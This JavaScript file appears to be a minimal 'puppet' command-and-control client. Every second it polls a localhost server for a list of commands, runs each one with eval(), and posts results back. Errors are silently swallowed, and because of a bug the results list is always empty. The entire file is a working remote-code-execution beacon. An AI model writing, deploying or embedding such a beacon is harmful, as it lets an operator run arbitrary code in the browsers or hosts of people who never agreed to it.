const id = 'puppet';
// const cmds = [
//     'a = {derp: "lol"};',
//     'output.push(JSON.stringify(a));'
// ];

const urlCommands = 'http://localhost:5000/api/command'+'?id='+id;
const urlResults = 'http://localhost:5000/api/result';
const getCommandsConfig = {
    method: "GET", // *GET, POST, PUT, DELETE, etc.
    mode: "cors", // no-cors, cors, *same-origin
    cache: "no-cache", // *default, no-cache, reload, force-cache, only-if-cached
    //credentials: "same-origin", // include, *same-origin, omit
    headers: {
        "Access-Control-Allow-Headers": "*",
        "Content-Type": "application/json",
        // "Content-Type": "application/x-www-form-urlencoded",
    },
    //redirect: "follow", // manual, *follow, error
    referrer: "no-referrer", // no-referrer, *client
    //body: JSON.stringify({id: id}) // body data type must match "Content-Type" header
};
const postResultsConfig = {
    method: "POST", // *GET, POST, PUT, DELETE, etc.
    mode: "cors", // no-cors, cors, *same-origin
    cache: "no-cache", // *default, no-cache, reload, force-cache, only-if-cached
    //credentials: "same-origin", // include, *same-origin, omit
    headers: {
        "Access-Control-Allow-Headers": "*",
        "Content-Type": "application/json",
        // "Content-Type": "application/x-www-form-urlencoded",
    },
    //redirect: "follow", // manual, *follow, error
    referrer: "no-referrer", // no-referrer, *client
    //body: JSON.stringify({id: id}) // body data type must match "Content-Type" header
};

var output = [];

setInterval(() => {
    fetch(urlCommands, getCommandsConfig).then((response) => {
        response.text().then((text) => {
            try {
                const results = [];
                cmds = JSON.parse(text);
                cmds.forEach(cmd => {
                    eval(cmd);
                });
                postResultsConfig.body = JSON.stringify({
                    id: id,
                    results: results
                });
                fetch(urlResults, postResultsConfig);
            } catch (error) {
                
            }
        });
    });
}, 1000)